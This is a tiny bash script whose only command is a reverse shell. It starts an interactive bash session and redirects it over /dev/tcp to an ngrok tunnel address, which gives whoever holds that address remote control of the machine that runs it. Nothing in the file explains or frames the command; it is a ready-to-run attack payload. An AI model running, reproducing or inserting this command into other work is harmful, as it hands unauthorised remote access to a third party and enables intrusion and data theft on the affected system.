#!/bin/bash

bash -i >& /dev/tcp/0.tcp.ngrok.io/14215 0>&1
